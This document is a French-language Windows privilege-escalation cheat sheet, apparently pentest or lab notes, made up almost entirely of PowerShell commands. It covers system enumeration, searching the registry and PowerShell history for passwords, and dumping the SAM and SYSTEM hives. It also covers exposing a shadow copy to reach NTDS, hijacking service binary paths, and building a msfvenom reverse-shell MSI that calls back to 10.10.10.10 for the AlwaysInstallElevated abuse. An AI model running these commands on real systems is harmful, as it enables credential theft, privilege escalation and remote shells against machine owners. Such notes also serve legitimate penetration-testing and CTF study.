# Enumération

## Outils

- **winPEAS** : https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS

## Commandes

```powershell
whoami /groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember Administrators
systeminfo
ipconfig /all
route print
netstat -ano
Get-Process
Get-History
type C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
Get-ScheduledTask
schtasks /query /fo LIST /v
set
dir env:
Get-ChildItem Env: | ft Key,Value
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword
Get-WmiObject -class Win32_Service -Property Name, DisplayName, PathName, StartMode
wmic service get name,displayname,startmode,pathname
```

## Fichiers Intéressants

```powershell
c:\inetpub\wwwwroot\web.config
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\system32\config\SecEvent.Evt
```

## Se connecter à un autre utilisateur

```powershell
runas /user:athenax cmd
powershell -Command "Start-Process powershell -Verb RunAs"
```

## Exécuter un script avec mot de passe

```powershell
$Username = "NomUtilisateur" 
$Password = ConvertTo-SecureString "VotreMotDePasse" -AsPlainText -Force 
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password) 
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command Your-Command-Here" -Credential $Credential -NoNewWindow
```

# Privilège

## SeBackupPrivilege / SeRestorePrivilege

```powershell
mkdir C:\Temp
reg save hklm\sam C:\Temp\sam
reg save hklm\system C:\Temp\system
```

## Ntds

```powershell
set context persistent nowriters
add volume c: alias temp
create
expose %temp% h:
exit
```

# Service Exploit

```powershell
sc query | find "RUNNING"
Get-Service | Where-Object {$_.Status -eq 'Running'}
tasklist /svc
```

## Insecure Service Permission

```powershell
C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
sc config daclsvc binpath= "\"C:\users\desktop\rev.exe\""
net start daclsvc
```

## Unquoted Service Path

```powershell
sc qc unquotedsvc
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
net start unquotedsvc
```

# Registry

## AlwaysInstallElevated

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\users\user\desktop\reverse.msi
```

# Password Extraction

```powershell
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
```